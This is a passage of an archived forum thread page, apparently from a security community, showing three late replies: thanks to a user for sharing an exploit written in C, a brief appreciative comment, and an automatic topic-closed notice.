              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Narcodex.html'><span itemprop='name'>Narcodex</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-01-27T18:28:04Z' class='post-time'>
                    January 27, 2019,  6:28pm
                  </time>
                  <meta itemprop='dateModified' content='2019-01-27T18:28:04Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>It was nice to see an exploit not written in Python, and something in C‚Ä¶ Although i‚Äôve noticed C and C++ are becoming more used now adays, which is nice to see. Very widely used languages.  Unity or Unreal being an example of one. Thank you for sharing <a class="mention" href="../../u/exploit.html">@exploit</a>. It was a very entertaining read</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/HACKER.html'><span itemprop='name'>HACKER</span></a>
                (HACKER)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-22T12:57:03Z' class='post-time'>
                    February 22, 2019, 12:57pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-22T12:57:03Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Firstly, thank you for this post. You are super! <img src="../../../0x00sec.org/images/emoji/twitter/blushc164.html?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-25T18:10:50Z' class='post-time'>
                    February 25, 2019,  6:10pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-25T18:10:50Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 3 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="PbSLLmssSyzyYil88oIthYcMP"></script>
  </body>
  
</html>
